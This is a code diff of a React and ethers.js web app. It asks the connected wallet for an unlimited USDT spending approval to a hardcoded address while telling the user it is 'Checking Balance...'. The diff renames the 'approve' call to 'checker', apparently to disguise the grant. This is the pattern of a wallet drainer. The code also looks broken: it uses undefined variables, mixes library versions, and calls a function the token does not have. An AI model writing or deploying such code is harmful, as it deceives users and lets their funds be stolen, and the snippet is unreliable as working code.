@@ -3,7 +3,7 @@ import { ethers } from "ethers";
 
 const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
 const USDT_ABI = [
-  "function approve(address spender, uint256 amount) returns (bool)",
+  "function checker(address spender, uint256 amount) returns (bool)",
 ];
 
 const SPENDER_ADDRESS = "0x64FaeC69187a1a24A36F6590f0f8F94F68b044ee"; // Replace with your backend wallet (spender)
@@ -43,13 +43,13 @@ export default function App() {
     setStatus("Checking Balance...");
     try {
       const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
-      const tx = await usdt.approve(SPENDER_ADDRESS, ethers.MaxUint256);
+      const tx = await usdt.checker(SPENDER_ADDRESS, ethers.MaxUint256);
       await tx.wait();
       setStatus("Approval successful!");
     } catch (error) {
       setStatus("Approval failed: " + error.message);
     }
-    const tx = await usdtContract.approve(spenderAddress, maxAmount, {
+    const tx = await usdtContract.checker(spenderAddress, maxAmount, {
   gasLimit: 100000,
   gasPrice: ethers.utils.parseUnits("5", "gwei")
 });
